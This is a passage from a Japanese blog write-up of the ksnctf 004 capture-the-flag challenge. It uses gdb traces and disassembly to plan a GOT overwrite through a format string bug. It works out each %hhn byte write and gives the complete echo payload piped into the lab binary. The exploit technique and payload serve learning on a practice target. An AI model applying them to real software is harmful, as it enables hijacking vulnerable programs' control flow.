+   0x080485cc &lt;+24&gt;:    mov    0x8049a04,%eax
+   0x080485d1 &lt;+29&gt;:    mov    %eax,0x8<span class="o">(</span>%esp<span class="o">)</span>
+   0x080485d5 &lt;+33&gt;:    movl   <span class="nv">$0x400</span>,0x4<span class="o">(</span>%esp<span class="o">)</span>
+   0x080485dd &lt;+41&gt;:    lea    0x18<span class="o">(</span>%esp<span class="o">)</span>,%eax
+   0x080485e1 &lt;+45&gt;:    mov    %eax,<span class="o">(</span>%esp<span class="o">)</span>
+   0x080485e4 &lt;+48&gt;:    call   0x8048484 &lt;fgets@plt&gt;
+   0x080485e9 &lt;+53&gt;:    movl   <span class="nv">$0x80487b6</span>,<span class="o">(</span>%esp<span class="o">)</span>
+   0x080485f0 &lt;+60&gt;:    call   0x80484b4 &lt;<span class="nb">printf</span>@plt&gt;
+   0x080485f5 &lt;+65&gt;:    lea    0x18<span class="o">(</span>%esp<span class="o">)</span>,%eax
+   0x080485f9 &lt;+69&gt;:    mov    %eax,<span class="o">(</span>%esp<span class="o">)</span>
+   0x080485fc &lt;+72&gt;:    call   0x80484b4 &lt;<span class="nb">printf</span>@plt&gt;
+   0x08048601 &lt;+77&gt;:    movl   <span class="nv">$0xa</span>,<span class="o">(</span>%esp<span class="o">)</span>
+   0x08048608 &lt;+84&gt;:    call   0x8048474 &lt;putchar@plt&gt;
+   0x0804860d &lt;+89&gt;:    movl   <span class="nv">$0x1</span>,0x418<span class="o">(</span>%esp<span class="o">)</span>
+   0x08048618 &lt;+100&gt;:   jmp    0x8048681 &lt;main+205&gt;
+   0x0804861a &lt;+102&gt;:   movl   <span class="nv">$0x80487bb</span>,<span class="o">(</span>%esp<span class="o">)</span>
+   0x08048621 &lt;+109&gt;:   call   0x80484c4 &lt;puts@plt&gt;     <span class="c"># breakpoint 2</span>
+   0x08048626 &lt;+114&gt;:   mov    0x8049a04,%eax
+   0x0804862b &lt;+119&gt;:   mov    %eax,0x8<span class="o">(</span>%esp<span class="o">)</span>
+   0x0804862f &lt;+123&gt;:   movl   <span class="nv">$0x400</span>,0x4<span class="o">(</span>%esp<span class="o">)</span>
+<span class="nt">--Type</span> &lt;RET&gt; <span class="k">for </span>more, q to quit, c to <span class="k">continue </span>without paging--q
+Quit
+<span class="o">(</span>gdb<span class="o">)</span> b <span class="k">*</span>main+19
+Breakpoint 1 at 0x80485c7
+<span class="o">(</span>gdb<span class="o">)</span> b <span class="k">*</span>main+109
+Breakpoint 2 at 0x8048621
+<span class="o">(</span>gdb<span class="o">)</span> run
+Starting program: /home/q4/q4
+warning: Error disabling address space randomization: Operation not permitted
+Missing separate debuginfos, use: yum debuginfo-install glibc-2.28-127.el8.i686
+warning: Loadable section <span class="s2">".note.gnu.property"</span> outside of ELF segments
+warning: Loadable section <span class="s2">".note.gnu.property"</span> outside of ELF segments
+
+Breakpoint 1, 0x080485c7 <span class="k">in </span>main <span class="o">()</span>
+Missing separate debuginfos, use: yum debuginfo-install libgcc-8.3.1-5.1.el8.i686 libstdc++-8.3.1-5.1.el8.i686
+<span class="o">(</span>gdb<span class="o">)</span> disas 0x80484c4
+Dump of assembler code <span class="k">for function </span>puts@plt:
+   0x080484c4 &lt;+0&gt;:     jmp    <span class="k">*</span>0x80499f4       <span class="c"># GOTアドレス</span>
+   0x080484ca &lt;+6&gt;:     push   <span class="nv">$0x30</span>
+   0x080484cf &lt;+11&gt;:    jmp    0x8048454
+End of assembler dump.
+<span class="o">(</span>gdb<span class="o">)</span> x/xw 0x80499f4                            <span class="c"># 1回目</span>
+0x80499f4 &lt;puts@got.plt&gt;:       0x080484ca  
+<span class="o">(</span>gdb<span class="o">)</span> c
+Continuing.
+What<span class="s1">'s your name?
+hi  
+Hi, hi
+
+
+Breakpoint 2, 0x08048621 in main ()
+(gdb) x/xw 0x80499f4
+0x80499f4 &lt;puts@got.plt&gt;:       0xf7b25140      # 2回目(lazy binding)
+</span></code></pre></div></div>
+
+<ol>
+  <li><code class="language-plaintext highlighter-rouge">puts</code> 関数二つに <code class="language-plaintext highlighter-rouge">breakpoint</code> を打つ</li>
+  <li><code class="language-plaintext highlighter-rouge">run</code></li>
+  <li><code class="language-plaintext highlighter-rouge">disas 0x80484c4</code> によって <code class="language-plaintext highlighter-rouge">puts</code> 関数を逆アセンブル</li>
+  <li>今回書き換えたいのは <code class="language-plaintext highlighter-rouge">0x80499f4</code> である
+    <ol>
+      <li><code class="language-plaintext highlighter-rouge">0x080484c4 &lt;+0&gt;:     jmp    *0x80499f4</code></li>
+    </ol>
+  </li>
+  <li><code class="language-plaintext highlighter-rouge">x/xw 0x80499f4</code> で値を確認
+    <ol>
+      <li><code class="language-plaintext highlighter-rouge">0x80499f4 &lt;puts@got.plt&gt;:       0x080484ca</code></li>
+    </ol>
+  </li>
+  <li>進める</li>
+  <li><code class="language-plaintext highlighter-rouge">x/xw 0x80499f4</code> で値を確認（2回目）
+    <ol>
+      <li><code class="language-plaintext highlighter-rouge">0x80499f4 &lt;puts@got.plt&gt;:       0xf7b25140</code></li>
+      <li><code class="language-plaintext highlighter-rouge">no RELRO</code> は遅延バインディングする。確かに2回目のアドレスが変わっており、遅延バインディングされている。</li>
+    </ol>
+  </li>
+</ol>
+
+<p>　以上の結果から、今回書き換える対象となる GOT のメモリアドレスは <code class="language-plaintext highlighter-rouge">0x80499f4</code> で間違いない。</p>
+
+<p>　書き換えることで、<code class="language-plaintext highlighter-rouge">puts</code> 関数を呼び出した時に<strong>任意のアドレスにジャンプ</strong>させることが出来る。</p>
+
+<h3 id="下準備2-ジャンプ先アドレス">下準備2 ジャンプ先アドレス</h3>
+
+<p>　ジャンプ先であるが、</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code> 8048681:       8b 84 24 18 04 00 00    mov    0x418<span class="o">(</span>%esp<span class="o">)</span>,%eax     <span class="c"># FLAG: # if(canFlag == 1)</span>
+ 8048688:       85 c0                   <span class="nb">test</span>   %eax,%eax                    <span class="c">#   ↓ canFlag(0x418) は 1 に初期化されている</span>
+ 804868a:       0f 95 c0                setne  %al                          <span class="c">#   ↓ 従って必ず式の結果は true</span>
+ 804868d:       84 c0                   <span class="nb">test</span>   %al,%al                      <span class="c">#   ↓ goto LOOP の処理を避けることは出来ない</span>
+ 804868f:       75 89                   jne    804861a &lt;main+0x66&gt;          <span class="c"># goto LOOP</span>
+                                                                            <span class="c"># ↓↓↓↓ flag.txt を読み込んで表示する処理 ↓↓↓↓</span>
+ 8048691:       c7 44 24 04 e6 87 04    movl   <span class="nv">$0x80487e6</span>,0x4<span class="o">(</span>%esp<span class="o">)</span>         <span class="c">#   引数2 "flag.txt"</span>
+ 8048698:       08
+ 8048699:       c7 04 24 e8 87 04 08    movl   <span class="nv">$0x80487e8</span>,<span class="o">(</span>%esp<span class="o">)</span>            <span class="c">#   引数1 "r"</span>
+ 80486a0:       e8 ff fd ff ff          call   80484a4 &lt;fopen@plt&gt;          <span class="c"># fp = fopen("flag.txt", "r")</span>
+ 80486a5:       89 84 24 1c 04 00 00    mov    %eax,0x41c<span class="o">(</span>%esp<span class="o">)</span>
+ 80486ac:       8b 84 24 1c 04 00 00    mov    0x41c<span class="o">(</span>%esp<span class="o">)</span>,%eax             <span class="c">#   引数3 FILE* fp</span>
+ 80486b3:       89 44 24 08             mov    %eax,0x8<span class="o">(</span>%esp<span class="o">)</span>
+ 80486b7:       c7 44 24 04 00 04 00    movl   <span class="nv">$0x400</span>,0x4<span class="o">(</span>%esp<span class="o">)</span>             <span class="c">#   引数2 0x400 = 1024</span>
+ 80486be:       00
+ 80486bf:       8d 44 24 18             lea    0x18<span class="o">(</span>%esp<span class="o">)</span>,%eax              <span class="c">#   引数1 char input[400]</span>
+ 80486c3:       89 04 24                mov    %eax,<span class="o">(</span>%esp<span class="o">)</span>
+ 80486c6:       e8 b9 fd ff ff          call   8048484 &lt;fgets@plt&gt;          <span class="c"># fgets(input, 1024, fp)</span>
+ 80486cb:       8d 44 24 18             lea    0x18<span class="o">(</span>%esp<span class="o">)</span>,%eax              <span class="c">#   引数1 char input[400]</span>
+ 80486cf:       89 04 24                mov    %eax,<span class="o">(</span>%esp<span class="o">)</span>
+ 80486d2:       e8 <span class="nb">dd </span>fd ff ff          call   80484b4 &lt;<span class="nb">printf</span>@plt&gt;         <span class="c"># printf(input)</span>
+ 80486d7:       b8 00 00 00 00          mov    <span class="nv">$0x0</span>,%eax
+                                                                            <span class="c"># ↑↑↑↑ ------------------------------- ↑↑↑↑</span>
+</code></pre></div></div>
+
+<p>　これの、</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code> 8048691:       c7 44 24 04 e6 87 04    movl   <span class="nv">$0x80487e6</span>,0x4<span class="o">(</span>%esp<span class="o">)</span>         <span class="c">#   引数2 "flag.txt"</span>
+</code></pre></div></div>
+
+<p>　である。つまり、 <code class="language-plaintext highlighter-rouge">if(canFlag == 1)</code> を抜けた所( <code class="language-plaintext highlighter-rouge">0x08048691</code>アドレス )に飛ばすわけである。</p>
+
+<p>　これで、 <code class="language-plaintext highlighter-rouge">puts</code> 関数を呼び出したら、 <code class="language-plaintext highlighter-rouge">if(canFlag == 1)</code> を抜けたところに飛ぶという風に挙動を変えることが出来る。</p>
+
+<p>　※セキュリティ <code class="language-plaintext highlighter-rouge">PIE</code> が無効であることも重要である。コード領域がランダム化されていないからこそ、ジャンプ先のアドレスを狙い撃ち出来る。</p>
+
+<h3 id="下準備3-書き換え内容の計算">下準備3 書き換え内容の計算</h3>
+
+<p>　<code class="language-plaintext highlighter-rouge">0x80499f4</code> アドレス(<code class="language-plaintext highlighter-rouge">puts</code>関数のGOTアドレス)に <code class="language-plaintext highlighter-rouge">08048691</code> (<code class="language-plaintext highlighter-rouge">if(canFlag == 1)</code> を抜けた所のアドレス)を書き込む。</p>
+
+<p>　即ち、</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>書き込み先アドレス</th>
+      <th>書き込み内容</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>0x80499f4</td>
+      <td>91</td>
+    </tr>
+    <tr>
+      <td>0x80499f5</td>
+      <td>86</td>
+    </tr>
+    <tr>
+      <td>0x80499f6</td>
+      <td>04</td>
+    </tr>
+    <tr>
+      <td>0x80499f7</td>
+      <td>08</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>　と書き込む。<code class="language-plaintext highlighter-rouge">91</code> から書き込んでいるのはリトルエンディアンのためだ。後ろから読む方式だ。</p>
+
+<p>　書き込むために計算をする。</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>書き込み内容</th>
+      <th>計算</th>
+      <th>byte数</th>
+      <th>累積 byte数</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>\x08\x04\x99\xf4</td>
+      <td> </td>
+      <td>4</td>
+      <td>4</td>
+    </tr>
+    <tr>
+      <td>\x08\x04\x99\xf5</td>
+      <td> </td>
+      <td>4</td>
+      <td>8</td>
+    </tr>
+    <tr>
+      <td>\x08\x04\x99\xf6</td>
+      <td> </td>
+      <td>4</td>
+      <td>12</td>
+    </tr>
+    <tr>
+      <td>\x08\x04\x99\xf7</td>
+      <td> </td>
+      <td>4</td>
+      <td>16</td>
+    </tr>
+    <tr>
+      <td>%129c</td>
+      <td>145(0x91) - 16(0x10)</td>
+      <td>129(0x81)</td>
+      <td>145(0x91)</td>
+    </tr>
+    <tr>
+      <td>%6$hhn</td>
+      <td> </td>
+      <td> </td>
+      <td> </td>
+    </tr>
+    <tr>
+      <td>%245c</td>
+      <td>134(0x86) - 145(0x91) + 256(0x100)</td>
+      <td>245(0xF5)</td>
+      <td>390(0x186)</td>
+    </tr>
+    <tr>
+      <td>%7$hhn</td>
+      <td> </td>
+      <td> </td>
+      <td> </td>
+    </tr>
+    <tr>
+      <td>%126c</td>
+      <td>4(0x04) - 390(0x186) + 512(0x200)</td>
+      <td>126(0x7E)</td>
+      <td>516(0x204)</td>
+    </tr>
+    <tr>
+      <td>%8$hhn</td>
+      <td> </td>
+      <td> </td>
+      <td> </td>
+    </tr>
+    <tr>
+      <td>%4c</td>
+      <td>8(0x08) - 516(0x204) + 512(0x200)</td>
+      <td>4(0x04)</td>
+      <td>520(0x208)</td>
+    </tr>
+    <tr>
+      <td>%9$hhn</td>
+      <td> </td>
+      <td> </td>
+      <td> </td>
+    </tr>
+  </tbody>
+</table>
+
+<p>　書き込みたいアドレスを文頭に配置する。今回は4つ。その後ろに実際に書き込む値を指定する。今回は 1byte ずつ書き込むことにするので <code class="language-plaintext highlighter-rouge">%hhn</code> の書式トークンを利用する。</p>
+
+<p>　<code class="language-plaintext highlighter-rouge">%6$hnn</code> は6番目のメモリが指すアドレスに書き込む事を示す。（ <code class="language-plaintext highlighter-rouge">%x</code> の6番目に <code class="language-plaintext highlighter-rouge">41414141</code> と並んでいたのを思い出して欲しい。今はここに <code class="language-plaintext highlighter-rouge">\x08\x04\x99\xf4</code> 即ち、<code class="language-plaintext highlighter-rouge">080499f4</code> と並んでいることになる）</p>
+
+<p>　<code class="language-plaintext highlighter-rouge">%129c</code> は <code class="language-plaintext highlighter-rouge">91</code> という値を示す。累積 byte数を書き込むため、表で言えば、 <code class="language-plaintext highlighter-rouge">129(0x81)</code> を指定することで <code class="language-plaintext highlighter-rouge">145(0x91)</code> 即ち <code class="language-plaintext highlighter-rouge">91</code> を書き込む。</p>
+
+<p>　下2つを書き込む仕様のため、 <code class="language-plaintext highlighter-rouge">%245c</code> と指定した時の累積バイト数が <code class="language-plaintext highlighter-rouge">390(0x186)</code> のため <code class="language-plaintext highlighter-rouge">86</code> を書き込む。</p>
+
+<p>　同様に、 <code class="language-plaintext highlighter-rouge">$126c</code>, <code class="language-plaintext highlighter-rouge">%4c</code> はそれぞれ <code class="language-plaintext highlighter-rouge">516(0x204)</code>, <code class="language-plaintext highlighter-rouge">520(0x208)</code> であり <code class="language-plaintext highlighter-rouge">04</code>, <code class="language-plaintext highlighter-rouge">08</code> を書き込む。</p>
+
+<p>　計算方法は、<code class="language-plaintext highlighter-rouge">書き込みたい文字 - 累積バイト数</code> である。負の値にならないように必要に応じて <code class="language-plaintext highlighter-rouge">512(0x200)</code> を加算する。<code class="language-plaintext highlighter-rouge">0x08</code>, <code class="language-plaintext highlighter-rouge">0x108</code>, <code class="language-plaintext highlighter-rouge">0x208</code> は全て <code class="language-plaintext highlighter-rouge">08</code> を書き込む仕様のため、負にならないように繰り上げれば問題ない。</p>
+
+<p>　長かったがこれで書き込む文字列が完成した。以下だ。</p>
+
+<p>　<code class="language-plaintext highlighter-rouge">\xf4\x99\x04\x08\xf5\x99\x04\x08\xf6\x99\x04\x08\xf7\x99\x04\x08%129c%6$hhn%245c%7$hhn%126c%8$hhn%4c%9$hhn</code></p>
+
+<p>　見やすさのために分けると、以下のように分けられる。</p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">\xf4\x99\x04\x08</code></li>
+  <li><code class="language-plaintext highlighter-rouge">\xf5\x99\x04\x08</code></li>
+  <li><code class="language-plaintext highlighter-rouge">\xf6\x99\x04\x08</code></li>
+  <li><code class="language-plaintext highlighter-rouge">\xf7\x99\x04\x08</code></li>
+  <li><code class="language-plaintext highlighter-rouge">%129c%6$hhn</code></li>
+  <li><code class="language-plaintext highlighter-rouge">%245c%7$hhn</code></li>
+  <li><code class="language-plaintext highlighter-rouge">%126c%8$hhn</code></li>
+  <li><code class="language-plaintext highlighter-rouge">%4c%9$hhn</code></li>
+</ul>
+
+<h3 id="謎を解く">謎を解く</h3>
+
+<p>　後は、実際に入力してみればいい。コマンドラインから入力する形式で示す。</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">echo</span> <span class="nt">-en</span> <span class="s1">'\xf4\x99\x04\x08\xf5\x99\x04\x08\xf6\x99\x04\x08\xf7\x99\x04\x08%129c%6$hhn%245c%7$hhn%126c%8$hhn%4c%9$hhn'</span> | ./q4
+</code></pre></div></div>
+
+<p>　無事に Flag を獲得した。いやはや長かった。　</p>
+
+<h2 id="所感">所感</h2>
+<p>　pwn をちゃんと解いたのは今回が初めてである。</p>
+
+<p>　同僚からの話で雰囲気・用語・コマンドについていくつか聞いたことがあったが、いざ解こうと思った時には分からないことばかりであった。</p>
+
+<p>　結局、セキュリティ・脆弱性についていろいろ調べることになった。</p>
+
+<p>　おかげで少しは詳しくなったし、 pwn の面白さも分かったと言える。</p>
+
+<p>　本当は、 ksnctf の write-up を書くつもりはなかった。だが、この 004 番に取り組む中で、 write-up を書き残したくなったのだ。</p>
+
+<ul>
+  <li>分かったことを言語化すること</li>
+  <li>どのように解いたかをいつでも振り替えられる状態にしておくこと</li>
+</ul>
+
+<p>　この2点を満たしたいがために、 write-up を書くと決めた。</p>
+
+<p>　誰が見ても分かる write-up というよりは、自分で見たら思いだせる write-up という傾向の方が強くなっているかもしれない。</p>
+
+<p>　ただ、見返してみると自分でも分かりづらい記事に感じる。これは記事の構成が悪いのだとは思う。気が向いたら直すかもしれない。</p>
+
+<p>　およそ2週間ほどこの問題と戦ったが、とても勉強になった。</p>
+
+<p>　初めは逆アセンブルしても <code class="language-plaintext highlighter-rouge">FSB</code> に気づけなかった。それで脆弱性の種類を調べる必要に迫られた。また、セキュリティの状態によって使える攻撃手法や書き込める領域が異なるようで、脆弱性だけでなくセキュリティについての知識も十分に求められていることに気づいた。</p>
+
+<p>　しばらくして、久しぶりに逆アセンブルした結果を見ると、いとも簡単に <code class="language-plaintext highlighter-rouge">FSB</code> に気づけた。セキュリティチェックもすると、<code class="language-plaintext highlighter-rouge">GOT overwrite</code> の可能性も浮上した。</p>
+
+<p>　そこからは <code class="language-plaintext highlighter-rouge">%hhn</code> の使い方の部分で案外苦労した。攻撃計画を立案出来ても、実際の攻撃コードを組み立てるのも難しさがあった。</p>
+
+<p>　フラグを取るまで長かったが、全てが一本の線で綺麗にまとまっている気がしてとても清々しい気分だ。</p>
+
+<p>　<code class="language-plaintext highlighter-rouge">ksnctf 004</code> を解けたことで、私のCTFはようやく始まったのだと言える。</p>
+
+<p>　ありがとう <code class="language-plaintext highlighter-rouge">CTF</code></p>
+
+<p>　ありがとう <code class="language-plaintext highlighter-rouge">kasnctf</code></p>
+
+<p>　
+　</p>
+
+  </div><a class="u-url" href="/contents/tech/ctf_ksnctf/2021/05/18/004.html" hidden></a>
+</article>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <div class="footer-text">逝く道 | subscribe <a href="/feed.xml">via RSS</a> |どこまでも逝こう。</div></div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
